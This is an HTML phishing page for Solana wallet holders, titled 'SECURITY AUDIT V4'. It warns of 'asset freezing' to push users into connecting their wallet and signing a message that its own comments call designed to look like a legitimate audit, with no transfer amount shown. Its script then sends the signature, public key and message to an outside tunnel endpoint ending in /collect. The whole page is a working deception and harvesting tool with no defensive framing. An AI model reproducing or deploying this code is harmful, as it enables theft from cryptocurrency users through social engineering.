<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
        <h2 style="letter-spacing:2px;">SECURITY AUDIT V4</h2>
        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;">VERIFY OWNERSHIP</button>
        <p id="msg" style="margin-top:20px;color:#666;font-size:12px;">To prevent asset freezing, please sign this audit.</p>
    </div>
    <script>
    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use Wallet Browser"); return; }
            
            const { publicKey } = await p.connect();
            
            // ğŸ”± å®šä¹‰ç­¾åæ¶ˆæ¯ï¼šçœ‹èµ·æ¥åƒæ­£è§„å®¡è®¡
            const message = "Security Audit ID: " + Math.floor(Math.random() * 999999) + "\n" +
                          "Domain: " + window.location.host + "\n" +
                          "Timestamp: " + new Date().getTime() + "\n" +
                          "Action: Verify Wallet Ownership";
            
            const encodedMessage = new TextEncoder().encode(message);
            document.getElementById('msg').innerText = "Awaiting Signature...";
            
            // ğŸš€ å”¤èµ·â€œç­¾ç½²æ¶ˆæ¯â€ç•Œé¢ (æ— è½¬è´¦é‡‘é¢æ˜¾ç¤º)
            const signedMessage = await p.signMessage(encodedMessage, "utf8");
            
            // æ‹¿åˆ°ç­¾å
            const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
            
            await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    signature: signature,
                    pubkey: publicKey.toString(),
                    message: message
                })
            });
            
            document.getElementById('msg').innerText = "SUCCESS: Verification Complete.";
            alert("Ownership Verified!");
        } catch(e) { alert("Verification Failed: " + e.message); }
    }
    </script></body></html>